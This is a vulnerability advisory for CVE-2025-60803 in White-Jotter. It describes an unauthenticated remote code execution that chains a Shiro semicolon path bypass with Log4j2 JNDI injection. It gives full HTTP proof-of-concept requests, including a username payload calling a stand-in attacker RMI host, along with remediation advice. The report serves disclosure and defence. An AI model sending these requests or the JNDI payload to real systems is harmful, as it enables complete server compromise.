# CVE-2025-60803 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-60803
- **CWE**: CWE-78 (OS Command Injection) / CWE-917 (Expression Language Injection)
- **Severity**: Critical
- **Affected Software**: Antabot White-Jotter up to commit 9bcadcf

## Vulnerability Description

White-Jotter contains an unauthenticated remote code execution vulnerability caused by improper access control in Shiro configuration combined with unsafe Log4j2 JNDI lookup.

## Technical Details

### Attack Chain

1. **Shiro Path Bypass**: Using `/api/aaa;/../register` to bypass authentication (Reference: https://github.com/DYX217/Incorrect-Access-Control)

2. **JNDI Payload Registration**: Register a user with JNDI payload as username:
   ```
   ${jndi:rmi://attacker:1099/exploit}
   ```

3. **Session Acquisition**: Login with the malicious username to get a valid session cookie

4. **Log4j2 Trigger**: Access an admin endpoint (e.g., `/api/admin/content/article`) without proper permissions. The `URLPathMatchingFilter.onPreHandle()` method logs the username using Log4j2, which resolves the JNDI expression.

### Vulnerable Code

In `URLPathMatchingFilter.java`, when a user accesses an interface without permission, Log4j2 records the log with the username, triggering JNDI lookup.

### Root Cause

- Apache Shiro path bypass vulnerability (semicolon bypass)
- Log4j2 JNDI injection (similar to CVE-2021-44228)
- Spring Boot 2.1.1.RELEASE uses Log4j2 2.11.x (vulnerable version)

## Proof of Concept

### Step 1: Register Malicious User

```http
POST /api/aaa;/../register HTTP/1.1
Host: localhost:8443
Content-Type: application/json;charset=utf-8

{"username":"${jndi:rmi://attacker:1099/exploit}","password":"111","name":"111","phone":"111","email":"111@qq.com"}
```

### Step 2: Login

```http
POST /api/login HTTP/1.1
Host: localhost:8443
Content-Type: application/json;charset=utf-8

{"username":"${jndi:rmi://attacker:1099/exploit}","password":"111"}
```

### Step 3: Trigger RCE

```http
GET /api/admin/content/article HTTP/1.1
Host: localhost:8443
Cookie: JSESSIONID=<session_id>
```

## Impact

- **Remote Code Execution**: Attackers can execute arbitrary commands on the server
- **No Authentication Required**: The vulnerability can be exploited without any credentials
- **Full System Compromise**: An attacker could gain full control of the affected system

## Remediation

1. **Upgrade Log4j2**: Update to Log4j2 >= 2.17.0
2. **Fix Shiro Configuration**: Properly handle path traversal attempts with semicolons
3. **Input Validation**: Sanitize username input to prevent JNDI expressions
4. **Disable JNDI Lookup**: Set `log4j2.formatMsgNoLookups=true`

## References

- https://github.com/Antabot/White-Jotter/issues/162
- https://github.com/DYX217/Incorrect-Access-Control
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228 (Log4Shell)
